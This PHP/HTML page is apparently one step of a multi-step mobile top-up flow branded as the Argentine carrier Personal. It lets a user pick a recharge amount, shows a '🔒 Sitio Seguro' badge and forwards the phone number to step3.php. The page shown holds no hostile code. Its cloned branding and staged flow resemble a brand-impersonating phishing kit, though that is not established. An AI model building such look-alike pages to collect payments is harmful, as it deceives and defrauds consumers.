<?php
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';

if(isset($_POST['amount'])) {
    ?>
    <form id="autoForm" method="POST" action="step3.php">
        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($_POST['amount']); ?>">
    </form>
    <script>document.getElementById('autoForm').submit();</script>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Monto a recargar | Personal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        
        .header {
            background: #2a2a2a;
            color: #fff;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .logo { font-size: 16px; font-weight: 500; }
        .sitio-seguro { font-size: 11px; }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px 15px;
        }
        
        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 400;
            margin-bottom: 20px;
            color: #333;
        }
        
        .descripcion {
            text-align: center;
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 25px;
            padding: 0 5px;
        }
        
        .monto-option {
            background: #fff;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 0;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            -webkit-tap-highlight-color: transparent;
        }
        
        .monto-option:active {
            transform: scale(0.98);
        }
        
        .monto-option input[type="radio"] {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .monto-option input[type="radio"]:checked + .monto-content {
            background: #E3F2FD;
            border-left-color: #2196F3;
        }
        
        .monto-option input[type="radio"]:checked + .monto-content .monto-valor {
            color: #1976D2;
        }
        
        .monto-option input[type="radio"]:checked + .monto-content .monto-regalo {
            color: #1976D2;
            font-weight: 600;
        }
        
        .monto-content {
            padding: 16px;
            border-left: 4px solid transparent;
            transition: all 0.3s ease;
            display: block;
            background: #fff;
        }
        
        .monto-valor {
            font-size: 24px;
            font-weight: 700;
            color: #000;
            margin-bottom: 4px;
            line-height: 1;
            transition: color 0.3s ease;
        }
        
        .monto-regalo {
            font-size: 13px;
            color: #5d8bf4;
            margin-bottom: 5px;
            line-height: 1.2;
            transition: all 0.3s ease;
        }
        
        .monto-detalles {
            font-size: 12px;
            color: #666;
            line-height: 1.3;
        }
        
        .botones {
            display: flex;
            gap: 10px;
            margin-top: 30px;
            position: sticky;
            bottom: 0;
            background: #f5f5f5;
            padding: 15px 0;
        }
        
        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
        }
        
        button:active {
            transform: scale(0.97);
        }
        
        .btn-volver {
            background: #6c757d;
            color: #fff;
        }
        
        .btn-siguiente {
            background: #5d8bf4;
            color: #fff;
        }
        
        .btn-siguiente:disabled {
            background: #ccc;
            cursor: not-allowed;
            opacity: 0.6;
        }
        
        /* TABLET */
        @media (min-width: 768px) {
            .header {
                padding: 15px 30px;
            }
            
            .logo { font-size: 18px; }
            .sitio-seguro { font-size: 12px; }
            
            .container {
                padding: 40px 20px;
            }
            
            h1 {
                font-size: 24px;
                margin-bottom: 30px;
            }
            
            .descripcion {
                font-size: 14px;
                margin-bottom: 40px;
            }
            
            .monto-option {
                margin-bottom: 12px;
            }
            
            .monto-content {
                padding: 20px;
            }
            
            .monto-valor {
                font-size: 28px;
            }
            
            .monto-regalo {
                font-size: 14px;
            }
            
            .monto-detalles {
                font-size: 13px;
            }
            
            .botones {
                margin-top: 40px;
                gap: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">personal flow</div>
        <div class="sitio-seguro">🔒 Sitio Seguro</div>
    </div>

    <div class="container">
        <h1>Monto a recargar</h1>
        
        <div class="descripcion">
            Con tu Recarga tenés un <strong>20%</strong> de crédito extra. Además si recargás <strong>$40000 o más</strong>, tenés <strong>2 GB para navegar y 2 GB para redes y video + WhatsApp gratis + Llamadas ilimitadas</strong> durante <strong>30 días</strong>
        </div>

        <form method="POST" action="step2.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            
            <label class="monto-option">
                <input type="radio" name="amount" value="7000" required>
                <div class="monto-content">
                    <div class="monto-valor">$7.000</div>
                    <div class="monto-regalo">+1.400 de regalo</div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 7 días</div>
                </div>
            </label>

            <label class="monto-option">
                <input type="radio" name="amount" value="10000">
                <div class="monto-content">
                    <div class="monto-valor">$10.000</div>
                    <div class="monto-regalo">+2.000 de regalo</div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 15 días</div>
                </div>
            </label>

            <label class="monto-option">
                <input type="radio" name="amount" value="15000">
                <div class="monto-content">
                    <div class="monto-valor">$15.000</div>
                    <div class="monto-regalo">+3.000 de regalo</div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 15 días</div>
                </div>
            </label>

            <label class="monto-option">
                <input type="radio" name="amount" value="20000">
                <div class="monto-content">
                    <div class="monto-valor">$20.000</div>
                    <div class="monto-regalo">+4.000 de regalo</div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
            </label>

            <label class="monto-option">
                <input type="radio" name="amount" value="25000">
                <div class="monto-content">
                    <div class="monto-valor">$25.000</div>
                    <div class="monto-regalo">+5.000 de regalo</div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
            </label>

            <label class="monto-option">
                <input type="radio" name="amount" value="30000">
                <div class="monto-content">
                    <div class="monto-valor">$30.000</div>
                    <div class="monto-regalo">+6.000 de regalo</div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
            </label>

            <div class="botones">
                <button type="button" class="btn-volver" onclick="window.history.back()">Volver</button>
                <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Continuar</button>
            </div>
        </form>
    </div>

    <script>
        document.querySelectorAll('input[name="amount"]').forEach(radio => {
            radio.addEventListener('change', () => {
                document.getElementById('btnContinuar').disabled = false;
            });
        });
    </script>
</body>
</html>